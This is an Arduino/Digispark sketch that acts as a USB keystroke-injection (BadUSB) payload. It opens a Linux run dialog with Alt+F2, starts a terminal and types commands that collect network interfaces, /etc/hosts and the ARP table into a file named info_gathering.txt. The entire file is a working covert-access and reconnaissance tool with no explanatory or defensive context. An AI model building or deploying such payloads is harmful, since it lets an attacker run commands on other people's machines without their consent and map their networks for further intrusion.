#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
  delay(3000);
  DigiKeyboard.println("gnome-terminal");
  delay(3000);
  DigiKeyboard.println("echo \"Network Configuration: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("ifconfig -a | grep 'Link\\|inet' >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo \"Print Hosts: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("cat /etc/hosts >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo \"Print ARP: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("arp >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  while(1);
}
